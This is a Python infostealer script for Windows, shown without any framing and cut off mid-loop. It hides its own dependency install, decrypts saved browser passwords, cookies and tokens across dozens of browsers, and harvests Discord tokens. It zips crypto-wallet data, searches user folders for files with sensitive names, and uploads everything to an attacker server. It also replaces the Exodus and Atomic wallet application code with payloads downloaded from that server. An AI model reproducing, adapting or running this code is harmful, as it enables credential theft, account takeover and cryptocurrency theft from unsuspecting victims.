import base64
import json
import os
import re
import sqlite3
import shutil
import subprocess
import zipfile
import sys
from zipfile import ZipFile
from urllib.request import Request, urlopen
import time

userid = "3"

CURRENT_INTERPRETER = sys.executable
proc = subprocess.Popen([CURRENT_INTERPRETER, "-m", "pip", "install", "pycryptodome", "pypiwin32", "pywin32","requests", "websocket-client"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
proc.wait()

try:
    import win32crypt
    from Crypto.Cipher import AES
    import requests
    import websocket

except:
    current_file = os.path.abspath(__file__)
    subprocess.Popen([CURRENT_INTERPRETER, current_file], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,creationflags=subprocess.CREATE_NO_WINDOW)
    exit()

USER_PROFILE = os.getenv('USERPROFILE')
APPDATA = os.getenv('APPDATA')
LOCALAPPDATA = os.getenv('LOCALAPPDATA')
STORAGE_PATH = os.path.join(APPDATA, "Microsoft Store")
MAIN_URL = "https://pentagon.cy"
PROGRAMFILESX86 = os.getenv("ProgramFiles(x86)")

COOKIECOUNT = 0
FILES = []

if os.path.exists(os.path.join(LOCALAPPDATA, "HD Realtek Audio Player")):
    sys.exit(0)
else:
    os.makedirs(os.path.join(LOCALAPPDATA, "HD Realtek Audio Player"))

if not os.path.exists(STORAGE_PATH):
    os.makedirs(STORAGE_PATH)

CHROME_PATHS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
]

CHROMIUM_BROWSERS = [
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome (x86)", "path": os.path.join(LOCALAPPDATA, "Google(x86)", "Chrome", "User Data"), "taskname": "chrome.exe", "exepath": PROGRAMFILESX86 + "\\Google\\Chrome\\Application\\chrome.exe"},
	{"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data"), "taskname": "chrome.exe", "exepath": LOCALAPPDATA + "\\Google\\Chrome SxS\\Application\\chrome.exe"},
	{"name": "Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data"), "taskname": "msedge.exe", "exepath": PROGRAMFILESX86 + "\\Microsoft\\Edge\\Application\\msedge.exe"},
	{"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data"), "taskname": "brave.exe", "exepath": "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable"), "taskname": "opera.exe", "exepath": ""},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable"), "taskname": "opera.exe", "exepath": ""},
    {"name": "Yandex", "path": os.path.join(APPDATA, "Yandex", "YandexBrowser", "User Data"), "taskname": "yandex.exe", "exepath": ""},
    {"name": "Chromium", "path": os.path.join(LOCALAPPDATA, "Chromium", "User Data"), "taskname": "chromium.exe", "exepath": ""},
    {"name": "Thorium", "path": os.path.join(LOCALAPPDATA, "Thorium", "User Data"), "taskname": "thorium.exe", "exepath": ""},
    {"name": "Maple", "path": os.path.join(LOCALAPPDATA, "MapleStudio", "ChromePlus", "User Data"), "taskname": "maple.exe", "exepath": ""},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data"), "taskname": "iridium.exe", "exepath": ""},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data"), "taskname": "7star.exe", "exepath": ""},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data"), "taskname": "centbrowser.exe", "exepath": ""},
    {"name": "Chedot", "path": os.path.join(LOCALAPPDATA, "Chedot", "User Data"), "taskname": "chedot.exe", "exepath": ""},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data"), "taskname": "vivaldi.exe", "exepath": ""},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data"), "taskname": "kometa.exe", "exepath": ""},
    {"name": "Elements", "path": os.path.join(LOCALAPPDATA, "Elements Browser", "User Data"), "taskname": "elements.exe", "exepath": ""},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data"), "taskname": "epic.exe", "exepath": ""},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data"), "taskname": "uran.exe", "exepath": ""},
    {"name": "Fenrir", "path": os.path.join(LOCALAPPDATA, "Fenrir Inc", "Sleipnir5", "setting", "modules", "ChromiumViewer"), "taskname": "fenrir.exe", "exepath": ""},
    {"name": "Catalina", "path": os.path.join(LOCALAPPDATA, "CatalinaGroup", "Citrio", "User Data"), "taskname": "catalina.exe", "exepath": ""},
    {"name": "Coowon", "path": os.path.join(LOCALAPPDATA, "Coowon", "Coowon", "User Data"), "taskname": "coowon.exe", "exepath": ""},
    {"name": "Liebao", "path": os.path.join(LOCALAPPDATA, "liebao", "User Data"), "taskname": "liebao.exe", "exepath": ""},
    {"name": "QIP Surf", "path": os.path.join(LOCALAPPDATA, "QIP Surf", "User Data"), "taskname": "qipsurf.exe", "exepath": ""},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data"), "taskname": "orbitum.exe", "exepath": ""},
    {"name": "Dragon", "path": os.path.join(LOCALAPPDATA, "Comodo", "Dragon", "User Data"), "taskname": "dragon.exe", "exepath": ""},
    {"name": "360Browser", "path": os.path.join(LOCALAPPDATA, "360Browser", "Browser", "User Data"), "taskname": "360browser.exe", "exepath": ""},
    {"name": "Maxthon", "path": os.path.join(LOCALAPPDATA, "Maxthon3", "User Data"), "taskname": "maxthon.exe", "exepath": ""},
    {"name": "K-Melon", "path": os.path.join(LOCALAPPDATA, "K-Melon", "User Data"), "taskname": "kmelon.exe", "exepath": ""},
    {"name": "CocCoc", "path": os.path.join(LOCALAPPDATA, "CocCoc", "Browser", "User Data"), "taskname": "coccoc.exe", "exepath": ""},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data"), "taskname": "amigo.exe", "exepath": ""},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data"), "taskname": "torch.exe", "exepath": ""},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data"), "taskname": "sputnik.exe", "exepath": ""},
    {"name": "DCBrowser", "path": os.path.join(LOCALAPPDATA, "DCBrowser", "User Data"), "taskname": "dcbrowser.exe", "exepath": ""},
    {"name": "UR Browser", "path": os.path.join(LOCALAPPDATA, "UR Browser", "User Data"), "taskname": "urbrowser.exe", "exepath": ""},
    {"name": "Slimjet", "path": os.path.join(LOCALAPPDATA, "Slimjet", "User Data"), "taskname": "slimjet.exe", "exepath": ""},
]

CHROMIUM_SUBPATHS = [
    {"path": ""},
    {"path": "Default"},
    {"path": "Profile 1"},
    {"path": "Profile 2"},
    {"path": "Profile 3"},
    {"path": "Profile 4"},
    {"path": "Profile 5"},
]

BROWSER_EXTENSIONS = [
    {"name": "Authenticator", "path": "\\Local Extension Settings\\bhghoamapcdpbohphigoooaddinpkbai"},
    {"name": "Binance", "path": "\\Local Extension Settings\\fhbohimaelbohpjbbldcngcnapndodjp"},
    {"name": "Bitapp", "path": "\\Local Extension Settings\\fihkakfobkmkjojpchpfgcmhfjnmnfpi"},
    {"name": "BoltX", "path": "\\Local Extension Settings\\aodkkagnadcbobfpggfnjeongemjbjca"},
    {"name": "Coin98", "path": "\\Local Extension Settings\\aeachknmefphepccionboohckonoeemg"},
    {"name": "Coinbase", "path": "\\Local Extension Settings\\hnfanknocfeofbddgcijnmhnfnkdnaad"},
    {"name": "Core", "path": "\\Local Extension Settings\\agoakfejjabomempkjlepdflaleeobhb"},
    {"name": "Crocobit", "path": "\\Local Extension Settings\\pnlfjmlcjdjgkddecgincndfgegkecke"},
    {"name": "Equal", "path": "\\Local Extension Settings\\blnieiiffboillknjnepogjhkgnoapac"},
    {"name": "Ever", "path": "\\Local Extension Settings\\cgeeodpfagjceefieflmdfphplkenlfk"},
    {"name": "ExodusWeb3", "path": "\\Local Extension Settings\\aholpfdialjgjfhomihkjbmgjidlcdno"},
    {"name": "Fewcha", "path": "\\Local Extension Settings\\ebfidpplhabeedpnhjnobghokpiioolj"},
    {"name": "Finnie", "path": "\\Local Extension Settings\\cjmkndjhnagcfbpiemnkdpomccnjblmj"},
    {"name": "Guarda", "path": "\\Local Extension Settings\\hpglfhgfnhbgpjdenjgmdgoeiappafln"},
    {"name": "Guild", "path": "\\Local Extension Settings\\nanjmdknhkinifnkgdcggcfnhdaammmj"},
    {"name": "HarmonyOutdated", "path": "\\Local Extension Settings\\fnnegphlobjdpkhecapkijjdkgcjhkib"},
    {"name": "Iconex", "path": "\\Local Extension Settings\\flpiciilemghbmfalicajoolhkkenfel"},
    {"name": "Jaxx Liberty", "path": "\\Local Extension Settings\\cjelfplplebdjjenllpjcblmjkfcffne"},
    {"name": "Kaikas", "path": "\\Local Extension Settings\\jblndlipeogpafnldhgmapagcccfchpi"},
    {"name": "KardiaChain", "path": "\\Local Extension Settings\\pdadjkfkgcafgbceimcpbkalnfnepbnk"},
    {"name": "Keplr", "path": "\\Local Extension Settings\\dmkamcknogkgcdfhhbddcghachkejeap"},
    {"name": "Liquality", "path": "\\Local Extension Settings\\kpfopkelmapcoipemfendmdcghnegimn"},
    {"name": "MEWCX", "path": "\\Local Extension Settings\\nlbmnnijcnlegkjjpcfjclmcfggfefdm"},
    {"name": "MaiarDEFI", "path": "\\Local Extension Settings\\dngmlblcodfobpdpecaadgfbcggfjfnm"},
    {"name": "Martian", "path": "\\Local Extension Settings\\efbglgofoippbgcjepnhiblaibcnclgk"},
    {"name": "Math", "path": "\\Local Extension Settings\\afbcbjpbpfadlkmhmclhkeeodmamcflc"},
    {"name": "Metamask", "path": "\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"},
    {"name": "Metamask2", "path": "\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"},
    {"name": "Mobox", "path": "\\Local Extension Settings\\fcckkdbjnoikooededlapcalpionmalo"},
    {"name": "Nami", "path": "\\Local Extension Settings\\lpfcbjknijpeeillifnkikgncikgfhdo"},
    {"name": "Nifty", "path": "\\Local Extension Settings\\jbdaocneiiinmjbjlgalhcelgbejmnid"},
    {"name": "Oxygen", "path": "\\Local Extension Settings\\fhilaheimglignddkjgofkcbgekhenbh"},
    {"name": "PaliWallet", "path": "\\Local Extension Settings\\mgffkfbidihjpoaomajlbgchddlicgpn"},
    {"name": "Petra", "path": "\\Local Extension Settings\\ejjladinnckdgjemekebdpeokbikhfci"},
    {"name": "Phantom", "path": "\\Local Extension Settings\\bfnaelmomeimhlpmgjnjophhpkkoljpa"},
    {"name": "Pontem", "path": "\\Local Extension Settings\\phkbamefinggmakgklpkljjmgibohnba"},
    {"name": "Ronin", "path": "\\Local Extension Settings\\fnjhmkhhmkbjkkabndcnnogagogbneec"},
    {"name": "Safepal", "path": "\\Local Extension Settings\\lgmpcpglpngdoalbgeoldeajfclnhafa"},
    {"name": "Saturn", "path": "\\Local Extension Settings\\nkddgncdjgjfcddamfgcmfnlhccnimig"},
    {"name": "Slope", "path": "\\Local Extension Settings\\pocmplpaccanhmnllbbkpgfliimjljgo"},
    {"name": "Solfare", "path": "\\Local Extension Settings\\bhhhlbepdkbapadjdnnojkbgioiodbic"},
    {"name": "Sollet", "path": "\\Local Extension Settings\\fhmfendgdocmcbmfikdcogofphimnkno"},
    {"name": "Starcoin", "path": "\\Local Extension Settings\\mfhbebgoclkghebffdldpobeajmbecfk"},
    {"name": "Swash", "path": "\\Local Extension Settings\\cmndjbecilbocjfkibfbifhngkdmjgog"},
    {"name": "TempleTezos", "path": "\\Local Extension Settings\\ookjlbkiijinhpmnjffcofjonbfbgaoc"},
    {"name": "TerraStation", "path": "\\Local Extension Settings\\aiifbnbfobpmeekipheeijimdpnlpgpp"},
    {"name": "Tokenpocket", "path": "\\Local Extension Settings\\mfgccjchihfkkindfppnaooecgfneiii"},
    {"name": "Ton", "path": "\\Local Extension Settings\\nphplpgoakhhjchkkhmiggakijnkhfnd"},
    {"name": "Tron", "path": "\\Local Extension Settings\\ibnejdfjmmkpcnlpebklmnkoeoihofec"},
    {"name": "Trust Wallet", "path": "\\Local Extension Settings\\egjidjbpglichdcondbcbdnbeeppgdph"},
    {"name": "Wombat", "path": "\\Local Extension Settings\\amkmjjmmflddogmhpjloimipbofnfjih"},
    {"name": "XDEFI", "path": "\\Local Extension Settings\\hmeobnfnfcmdkdcmlblgagmfpfboieaf"},
    {"name": "XMR.PT", "path": "\\Local Extension Settings\\eigblbgjknlfbajkfhopmcojidlgcehm"},
    {"name": "XinPay", "path": "\\Local Extension Settings\\bocpokimicclpaiekenaeelehdjllofo"},
    {"name": "Yoroi", "path": "\\Local Extension Settings\\ffnbelfdoeiohenkjibnmadjiehjhajb"},
    {"name": "iWallet", "path": "\\Local Extension Settings\\kncchdigobghenbbaddojjnnaogfppfj"}
]

WALLET_PATHS = [
    {"name": "Atomic", "path": os.path.join(APPDATA, "atomic", "Local Storage", "leveldb")},
    {"name": "Exodus", "path": os.path.join(APPDATA, "Exodus", "exodus.wallet")},
    {"name": "Electrum", "path": os.path.join(APPDATA, "Electrum", "wallets")},
    {"name": "Electrum-LTC", "path": os.path.join(APPDATA, "Electrum-LTC", "wallets")},
    {"name": "Zcash", "path": os.path.join(APPDATA, "Zcash")},
    {"name": "Armory", "path": os.path.join(APPDATA, "Armory")},
    {"name": "Bytecoin", "path": os.path.join(APPDATA, "bytecoin")},
    {"name": "Jaxx", "path": os.path.join(APPDATA, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb")},
    {"name": "Etherium", "path": os.path.join(APPDATA, "Ethereum", "keystore")},
    {"name": "Guarda", "path": os.path.join(APPDATA, "Guarda", "Local Storage", "leveldb")},
    {"name": "Coinomi", "path": os.path.join(APPDATA, "Coinomi", "Coinomi", "wallets")},
]

PATHS_TO_SEARCH = [
    USER_PROFILE + "\\Desktop",
    USER_PROFILE + "\\Documents",
    USER_PROFILE + "\\Downloads",
    USER_PROFILE + "\\OneDrive\\Documents",
    USER_PROFILE + "\\OneDrive\\Desktop",
]

FILE_KEYWORDS = [
        "passw",
        "mdp",
        "motdepasse",
        "mot_de_passe",
        "login",
        "secret",
        "account",
        "acount",
        "paypal",
        "banque",
        "metamask",
        "wallet",
        "crypto",
        "exodus",
        "discord",
        "2fa",
        "code",
        "memo",
        "compte",
        "token",
        "backup",
        "seecret"
        "passphrase"
]

ALLOWED_EXTENSIONS = [
    ".txt",
    ".log",
    ".doc",
    ".docx",
    ".xls",
    ".xlsx",
    ".ppt",
    ".pptx",
    ".odt",
    ".pdf",
    ".rtf",
    ".json",
    ".csv",
    ".db",
    ".jpg",
    ".jpeg",
    ".png",
    ".gif",
    ".webp",
    ".mp4"
]

DISCORD_PATHS = [
    {"name": "Discord", "path": os.path.join(APPDATA, "discord", "Local Storage", "leveldb")},
    {"name": "Discord Canary", "path": os.path.join(APPDATA, "discordcanary", "Local Storage", "leveldb")},
    {"name": "Discord PTB", "path": os.path.join(APPDATA, "discordptb", "Local Storage", "leveldb")},
    {"name": "Opera", "path": os.path.join(APPDATA, "Opera Software", "Opera Stable", "Local Storage", "leveldb")},
    {"name": "Opera GX", "path": os.path.join(APPDATA, "Opera Software", "Opera GX Stable", "Local Storage", "leveldb")},
    {"name": "Amigo", "path": os.path.join(LOCALAPPDATA, "Amigo", "User Data", "Local Storage", "leveldb")},
    {"name": "Torch", "path": os.path.join(LOCALAPPDATA, "Torch", "User Data", "Local Storage", "leveldb")},
    {"name": "Kometa", "path": os.path.join(LOCALAPPDATA, "Kometa", "User Data", "Local Storage", "leveldb")},
    {"name": "Orbitum", "path": os.path.join(LOCALAPPDATA, "Orbitum", "User Data", "Local Storage", "leveldb")},
    {"name": "CentBrowser", "path": os.path.join(LOCALAPPDATA, "CentBrowser", "User Data", "Local Storage", "leveldb")},
    {"name": "7Star", "path": os.path.join(LOCALAPPDATA, "7Star", "7Star", "User Data", "Local Storage", "leveldb")},
    {"name": "Sputnik", "path": os.path.join(LOCALAPPDATA, "Sputnik", "Sputnik", "User Data", "Local Storage", "leveldb")},
    {"name": "Vivaldi", "path": os.path.join(LOCALAPPDATA, "Vivaldi", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome SxS", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome SxS", "User Data", "Local Storage", "leveldb")},
    {"name": "Chrome", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Chrome1", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb")},
    {"name": "Chrome2", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb")},
    {"name": "Chrome3", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 3", "Local Storage", "leveldb")},
    {"name": "Chrome4", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 4", "Local Storage", "leveldb")},
    {"name": "Chrome5", "path": os.path.join(LOCALAPPDATA, "Google", "Chrome", "User Data", "Profile 5", "Local Storage", "leveldb")},
    {"name": "Epic Privacy Browser", "path": os.path.join(LOCALAPPDATA, "Epic Privacy Browser", "User Data", "Local Storage", "leveldb")},
    {"name": "Microsoft Edge", "path": os.path.join(LOCALAPPDATA, "Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Uran", "path": os.path.join(LOCALAPPDATA, "uCozMedia", "Uran", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Yandex", "path": os.path.join(LOCALAPPDATA, "Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Brave", "path": os.path.join(LOCALAPPDATA, "BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb")},
    {"name": "Iridium", "path": os.path.join(LOCALAPPDATA, "Iridium", "User Data", "Default", "Local Storage", "leveldb")}
]

DISCORD_TOKENS = []
PASSWORDS = []
COOKIES = []
WEB_DATA = []
DISCORD_IDS = []

def kill_process(process_name):
    result = subprocess.Popen(f"taskkill /im {process_name} /t /f >nul 2>&1", shell=True)

def decrypt_data(data, key):
    try:
        iv = data[3:15]
        data = data[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(data)[:-16].decode()
    except:
        return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])

def zip_to_storage(name, source, destination):
    if os.path.isfile(source):
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            z.write(source, os.path.basename(source))
    else:
        with zipfile.ZipFile(destination + f"\\{name}.zip", "w") as z:
            for root, dirs, files in os.walk(source):
                for file in files:
                    z.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), os.path.join(source, '..')))

def upload_to_server(filepath, loguuid):
    for i in range(10):
        try:
            url = MAIN_URL + "/delivery"
            files = {'file': open(filepath, 'rb')}
            headers = {'X-Trace-ID': loguuid}
            r = requests.post(url, files=files, headers = headers)
            if r.status_code == 200:
                break
        except: pass

def validate_discord_token(token):
    r = requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token})
    if r.status_code == 200:
        return r.json()
    else:
        return None

def taskkill(taskname):
    subprocess.run(["taskkill", "/F", "/IM", taskname], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def inject(loguuid):
    path = os.path.join(LOCALAPPDATA, "exodus")
    if not os.path.exists(path): return
    listOfFile = os.listdir(path)
    apps = []
    for file in listOfFile:
        if "app-" in file:
            apps += [file]
    exodusPatchURL = MAIN_URL + "/exodus"
    req = Request(exodusPatchURL)
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
    response = urlopen(req)
    data = response.read()
    kill_process("exodus.exe")
    for app in apps:
        try:
            fullpath = f"{path}\\{app}\\resources\\app.asar"
            with open(fullpath, 'wb') as out_file1:

                out_file1.write(data)
            licensepath = f"{path}\\{app}\\LICENSE"
            with open(licensepath, "w") as out_file2:
                out_file2.write(loguuid)
        except: pass

def inject_atomic(loguuid):
    path = os.path.join(LOCALAPPDATA, "Programs", "atomic")
    if not os.path.exists(path): return
    atomicPatchURL = MAIN_URL + "/atomic"
    req = Request(atomicPatchURL)
    req.add_header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36")
    response = urlopen(req)
    data = response.read()
    kill_process("Atomic Wallet.exe")
    try:
        fullpath = f"{path}\\resources\\app.asar"
        with open(fullpath, 'wb') as out_file1:

            out_file1.write(data)
        licensepath = f"{path}\\LICENSE.electron.txt"
        with open(licensepath, "w") as out_file2:
            out_file2.write(loguuid)
    except: pass

def chromiumcookies(profilepath):
    try:
        cookies_file = os.path.join(profilepath, "Network", "Cookies")
        temp_db = os.path.join(profilepath, f"{browser['name']}-ck.db")
        shutil.copy(cookies_file, temp_db)
        connection = sqlite3.connect(temp_db)
        cursor = connection.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")

        cookie_str = ""

        for row in cursor.fetchall():

            host = row[0]

            name = row[1]

            value = decrypt_data(row[2], decryption_key)

            cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
            COOKIECOUNT = COOKIECOUNT+1
        COOKIES.append({"browser": browser["name"], "profile": subpath["name"], "cookies": base64.b64encode(cookie_str.encode()).decode()})
        cursor.close()
        connection.close()
        os.remove(temp_db)
    except: pass

for browser in CHROMIUM_BROWSERS:
    taskkill(browser["taskname"])
    local_state = os.path.join(browser["path"], "Local State")
    if not os.path.exists(local_state): continue

    with open(local_state, "r", encoding="utf-8") as f:
        local_state = json.loads(f.read())

    key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
    try:
        decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except:
        pass
    for subpath in CHROMIUM_SUBPATHS:

        if not os.path.exists(os.path.join(browser["path"], subpath["path"])): continue

        try:
            login_data_file = os.path.join(browser["path"], subpath["path"], "Login Data")
            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-pw.db")
            shutil.copy(login_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():

                origin_url = row[0]

                username = row[1]

                password = decrypt_data(row[2], decryption_key)

                if username or password:
                    PASSWORDS.append({"browser": browser["name"], "url": origin_url, "username": username, "password": password})
            cursor.close()
            connection.close()
            os.remove(temp_db)

        except:
            pass

        try:
            if browser["exepath"] == "":
                chromiumcookies(os.path.join(browser["path"], subpath["path"]))
        except:
            pass

        try:
            web_data_file = os.path.join(browser["path"], subpath["path"], "Web Data")

            temp_db = os.path.join(browser["path"], subpath["path"], f"{browser['name']}-webdata.db")

            shutil.copy(web_data_file, temp_db)

            connection = sqlite3.connect(temp_db)

            cursor = connection.cursor()

            cursor.execute("SELECT service, encrypted_token FROM token_service")

            for row in cursor.fetchall():
                web_service = row[0]
                web_token = decrypt_data(row[1], decryption_key)
                WEB_DATA.append({"account_id": web_service, "refresh_token": web_token})

            cursor.close()

            connection.close()
            os.remove(temp_db)
        except:
            pass

        for extension in BROWSER_EXTENSIONS:
            extension_path = os.path.join(browser["path"], subpath["path"]) + extension["path"]
            if os.path.exists(extension_path):
                try:
                    zip_to_storage(f"{browser['name']}-{subpath['path']}-{extension['name']}", extension_path, STORAGE_PATH)
                except:
                    pass

firefox_path = os.path.join(APPDATA, 'Mozilla', 'Firefox', 'Profiles')

if os.path.exists(firefox_path):
    taskkill("firefox.exe")
    for profile in os.listdir(firefox_path):

        try:

            if profile.endswith('.default') or profile.endswith('.default-release'):

                profile_path = os.path.join(firefox_path, profile)

                if os.path.exists(os.path.join(profile_path, "cookies.sqlite")):

                    shutil.copy(os.path.join(profile_path, "cookies.sqlite"), os.path.join(profile_path, "cookies-copy.sqlite"))
                    connection = sqlite3.connect(os.path.join(profile_path, "cookies-copy.sqlite"))
                    cursor = connection.cursor()

                    cursor.execute("SELECT host, name, value FROM moz_cookies")

                    cookie_str = ""
                    for row in cursor.fetchall():
                        host, name, value = row
                        cookie_str += f"{host}\tTRUE\t/\tFALSE\t13355861278849698\t{name}\t{value}\n"
                        COOKIECOUNT = COOKIECOUNT+1
                    COOKIES.append({"browser": "Firefox", "profile": profile, "cookies": base64.b64encode(cookie_str.encode()).decode()})
                    cursor.close()
                    connection.close()
                    os.remove(os.path.join(profile_path, "cookies-copy.sqlite"))
        except:
            continue

for wallet_file in WALLET_PATHS:
    if os.path.exists(wallet_file["path"]):
        try:
            zip_to_storage(wallet_file["name"], wallet_file["path"], STORAGE_PATH)
        except:
            pass

for discord_path in DISCORD_PATHS:
    if not os.path.exists(discord_path["path"]): continue
    try:
        name_without_spaces = discord_path["name"].replace(" ", "")
        if "cord" in discord_path["path"]:
            if not os.path.exists(APPDATA + f"\\{name_without_spaces}\\Local State"): continue
            try:
                with open(APPDATA + f"\\{name_without_spaces}\\Local State", "r", encoding="utf-8") as f:
                    local_state = json.loads(f.read())

                key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

                decryption_key = win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]

                for file_name in os.listdir(discord_path["path"]):
                    if file_name[-3:] not in ["ldb", "log"]: continue
                    for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                        for y in re.findall(r"dQw4w9WgXcQ:[^\"]*", line):

                            token = decrypt_data(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), decryption_key)
                            token_data = validate_discord_token(token)

                            if token_data:
                                if token_data["id"] not in DISCORD_IDS:
                                    DISCORD_IDS.append(token_data["id"])
                                    username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                    phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                    DISCORD_TOKENS.append(
                                        {"token": token, "user_id": token_data["id"], "username": username,
                                         "displayname": token_data["global_name"], "email": token_data["email"],
                                         "phone": phone_number})
                                    TOKENCOUNT = TOKENCOUNT+1
            except:
                pass
        else:
            for file_name in os.listdir(discord_path["path"]):
                if file_name[-3:] not in ["ldb", "log"]: continue
                for line in [x.strip() for x in open(f'{discord_path["path"]}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                    for token in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line):
                        token_data = validate_discord_token(token)
                        if token_data:
                            if token_data["id"] not in DISCORD_IDS:
                                DISCORD_IDS.append(token_data["id"])
                                username = token_data["username"] if token_data["discriminator"] == "0" else f"{token_data['username']}#{token_data['discriminator']}"
                                phone_number = token_data["phone"] if token_data["phone"] else "Not linked"
                                DISCORD_TOKENS.append(
                                    {"token": token, "user_id": token_data["id"], "username": username,
                                     "displayname": token_data["global_name"], "email": token_data["email"],
                                     "phone": phone_number})
                                TOKENCOUNT = TOKENCOUNT+1
    except:
        pass


for browser in CHROME_PATHS:
        if os.path.exists(browser["path"]):
            try:
                taskkill(browser["taskname"])
                strtcmd = f'"{browser["exepath"]}" --headless --remote-debugging-port=9222 --remote-allow-origins=* --user-data-dir="{browser["path"]}"'
                subprocess.Popen(strtcmd, creationflags=subprocess.CREATE_NEW_CONSOLE, close_fds=True)
                targets = requests.get("http://localhost:9222/json").json()
                ws_url = targets[0]["webSocketDebuggerUrl"]
                ws = websocket.create_connection(ws_url)
                payload = {
                    "id": 1,
                    "method": "Network.getAllCookies"
                }
                ws.send(json.dumps(payload))
                cookie_str = ""
                for cookie in json.loads(ws.recv())["result"]["cookies"]:
                    cookie_str += f"{cookie['domain']}\tTRUE\t/\tFALSE\t13355861278849698\t{cookie['name']}\t{cookie['value']}\n"
                    COOKIECOUNT = COOKIECOUNT+1
                COOKIES.append({"browser": browser["name"], "profile": "Default", "cookies": base64.b64encode(cookie_str.encode()).decode()})
                ws.close()
                taskkill(browser["taskname"])
            except: pass

for path in PATHS_TO_SEARCH:
    for root, _, files in os.walk(path):
        for file_name in files:
            for keyword in FILE_KEYWORDS:
                if keyword in file_name.lower():
